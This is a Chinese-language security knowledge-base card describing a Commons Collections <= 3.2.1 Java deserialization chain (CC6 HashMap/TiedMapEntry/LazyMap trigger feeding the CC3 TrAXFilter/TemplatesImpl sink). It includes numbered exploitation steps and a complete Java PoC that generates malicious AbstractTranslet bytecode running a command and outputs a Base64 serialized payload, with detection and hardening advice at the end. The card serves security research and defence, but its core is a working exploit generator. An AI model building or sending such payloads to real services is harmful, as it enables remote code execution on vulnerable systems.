---
id: web-java-deser-commonscollections-cc6-cc3-templatesimpl
title: CC6 触发 + CC3 TemplatesImpl 攻击的 Commons Collections 组合链
type: scenario
domain: web
path: web/java/deserialization
technique: cc6-trigger-cc3-templatesimpl
tags:
- java
- deserialization
- gadget
- commons-collections
- cc6
- cc3
- templatesimpl
- tiedmapentry
- lazymap
- jdk8
cve: []
severity: high
confidence: high
status: verified
affected_versions: Commons Collections <= 3.2.1
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:38:50+08:00'
  notes: 已对照原文（无图片）核对：HashMap→TiedMapEntry.hashCode→LazyMap.get→ChainedTransformer→ConstantTransformer(TrAXFilter.class)→InstantiateTransformer→TrAXFilter 构造器→TemplatesImpl.newTransformer→defineTransletClasses 的 CC6 触发+CC3 攻击组合、AbstractTranslet 字节码与 _name/_bytecodes 设置、CC<=3.2.1 适用边界均与原文一致。原文组合 PoC 用 lazyMap.clear()，卡片用 innerMap.remove(key)，等价。卡片已注明 put 阶段会先触发一次 transform 的坑。PoC 未在本机执行。
url: /docs/web/java/deserialization/web-java-deser-commonscollections-cc6-cc3-templatesimpl/
draft: false
kb_aliases:
- CC6 触发 CC3 攻击
- Commons Collections 组合链
- HashMap 触发 TemplatesImpl
- TiedMapEntry LazyMap TrAXFilter
- CC6+CC3
---

## 一句话结论

在 Commons Collections <= 3.2.1 环境中，用 CC6 的 `HashMap`/`TiedMapEntry`/`LazyMap` 作为稳定触发器，接上 CC3 的 `InstantiateTransformer`/`TrAXFilter`/`TemplatesImpl` 字节码加载作为攻击目标，可在不依赖 `AnnotationInvocationHandler` 的情况下完成反序列化 RCE。

## 原理

- Java 原生反序列化链可拆成三段：触发器（`readObject` 中调用某个虚方法）、传递机制（`Transformer`/`Map` 把调用传导到 sink）、攻击目标（最终执行危险操作的类）。
- CC6 触发段：`HashMap.readObject()` 对每个 key 计算 `hash()` → `TiedMapEntry.hashCode()` → `getValue()` → `LazyMap.get(key)`。`LazyMap.get()` 在 key 不存在时调用装饰的 `Transformer.transform(key)`，从而进入攻击链。`HashMap` 的触发不依赖 `AnnotationInvocationHandler`，JDK 版本兼容性最好。
- CC3 攻击段：`ConstantTransformer` 返回 `TrAXFilter.class`；`InstantiateTransformer.transform()` 用 `Constructor.newInstance(templates)` 实例化 `TrAXFilter`。`TrAXFilter` 的公有构造函数内部调用 `templates.newTransformer()`，把受控 `TemplatesImpl` 送入 `TemplatesImpl.getTransletInstance()` → `defineTransletClasses()`，最终 `defineClass` 加载攻击者提供的字节码并执行其静态初始化块。
- 因此组合链为：`HashMap.readObject → TiedMapEntry.hashCode → LazyMap.get → ChainedTransformer → ConstantTransformer(TrAXFilter.class) → InstantiateTransformer → new TrAXFilter(templates) → TemplatesImpl.newTransformer → 恶意字节码 → RCE`。
- `TemplatesImpl` 需要 `_name` 非空且 `_bytecodes` 为攻击者字节码的二维数组；恶意类须继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，命令放在静态初始化块或 `_init` 中，才能在 `defineTransletClasses` 后被触发。

## 触发条件

- 应用使用 Java 原生反序列化（`ObjectInputStream.readObject`）且输入可控。
- 类路径存在 Commons Collections <= 3.2.1；3.2.2 起 `InstantiateTransformer.readObject()` 会调用 `FunctorUtils.checkUnsafeSerialization()` 抛异常，本链失效。
- 目标 JDK 可访问内部 Xalan `TemplatesImpl`/`TrAXFilter`（JDK 8 默认可用；高版本 JDK 模块封装后需改用外部 Xalan 依赖或其它 sink）。
- 攻击者能控制被反序列化对象的字段，并能用 Javassist/ASM 生成符合 `AbstractTranslet` 约束的字节码。

## 利用步骤

1. 确认依赖与 JDK：Commons Collections 版本 <= 3.2.1，原生反序列化入口可用。
2. 用 Javassist 生成继承 `AbstractTranslet` 的类，在静态初始化块写入命令，取 `toBytecode()`。
3. 构造 `TemplatesImpl`，反射设置 `_name`、`_bytecodes`（必要时设置 `_tfactory`）。
4. 构造 `ChainedTransformer`：`ConstantTransformer(TrAXFilter.class)` + `InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})`。
5. 用该 `ChainedTransformer` 装饰 `LazyMap`，再包成 `TiedMapEntry` 放入 `HashMap`。
6. 控制构造期与反序列化期的时序（见 PoC 注释），序列化 `HashMap` 得到 payload。
7. 把 payload 发送到目标反序列化入口，观察命令执行。

## PoC

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6TriggerCC3Attack {
    public static void main(String[] args) throws Exception {
        // 1. 生成恶意字节码：父类必须是 AbstractTranslet
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilClass");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertBefore(
            "Runtime.getRuntime().exec(\"calc\");");
        byte[] code = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "HelloTemplatesImpl");
        setField(templates, "_bytecodes", new byte[][]{code});
        setField(templates, "_tfactory", null);

        // 2. CC3 攻击段：TrAXFilter 构造函数内部调用 templates.newTransformer()
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                new Class[]{Templates.class},
                new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 3. CC6 触发段：HashMap -> TiedMapEntry.hashCode -> LazyMap.get
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");

        HashMap hashMap = new HashMap();
        hashMap.put(entry, "value");

        // 4. 时序控制：put 时已触发一次 transform 并把 key 写入 innerMap，
        //    必须删除缓存，否则反序列化时 LazyMap.get 直接返回缓存、不再 transform。
        innerMap.remove("key");

        byte[] payload = serialize(hashMap);
        System.out.println(Base64.getEncoder().encodeToString(payload));
    }

    static void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(obj);
        }
        return bos.toByteArray();
    }
}
```

```text
# 注意：上面的 hashMap.put() 会在生成阶段就触发一次 transform，
# 若命令有副作用（如反弹 shell）会先在本机执行。更稳妥的写法是：
# 先用 ConstantTransformer(无害常量) 完成 put，再反射把 iConstant 替换为
# TrAXFilter.class 并接上 InstantiateTransformer，最后删除 innerMap 中的 key。
```

## 变体与关联

- 变体：触发器可换成 `PriorityQueue`（`Comparator.compare`）或 `BadAttributeValueExpException`（`toString`），但要求上下游接口匹配，不能随意替换。
- 变体：攻击目标可换成 `Runtime.exec()` 的 `InvokerTransformer` 链（即经典 CC6），实现更简单但更容易被 WAF/RASP 拦截；`TemplatesImpl` 字节码加载更隐蔽。
- 变体：CC1 使用 `AnnotationInvocationHandler` + `TransformedMap.setValue()` + `InvokerTransformer`，在 JDK 8u71+ 因类型检查失效；CC3 改用动态代理 + `LazyMap` 绕过该检查，但仍依赖 `InstantiateTransformer`；CC6 改用 `HashMap` 触发，摆脱对 `AnnotationInvocationHandler` 的依赖。
- 关联：[[web-java-deser-commonscollections-322-jsonobject-getter-bypass]]（CC 3.2.2 禁用 `InstantiateTransformer` 后的替代绕过）；[[web-java-deserialization-external-xalan-templatesimpl-sink]]（高版本 JDK 下改用外部 Xalan 的 TemplatesImpl sink）。
- 边界：Commons Collections 3.2.2 及以上、JDK 模块封装导致 `TemplatesImpl` 不可用、或应用部署了 `ObjectInputFilter` 类白名单时链路失效。

## 检测与防御

- 检测：在反序列化流量/文件中检索 `TiedMapEntry`、`LazyMap`、`ChainedTransformer`、`TrAXFilter`、`TemplatesImpl` 等类名；监控 `ObjectInputStream` 反序列化后加载新类、执行 `Runtime.exec` 的行为。
- 修复：升级 Commons Collections 到 3.2.2+ 并保持 `enableUnsafeSerialization` 关闭；避免对外暴露原生 Java 反序列化入口，改用 JSON 等数据格式。
- 加固：配置 JEP 290 `ObjectInputFilter` 类白名单/黑名单；对必须反序列化的入口做签名与来源校验；升级 JDK 并限制内部 Xalan 类访问。
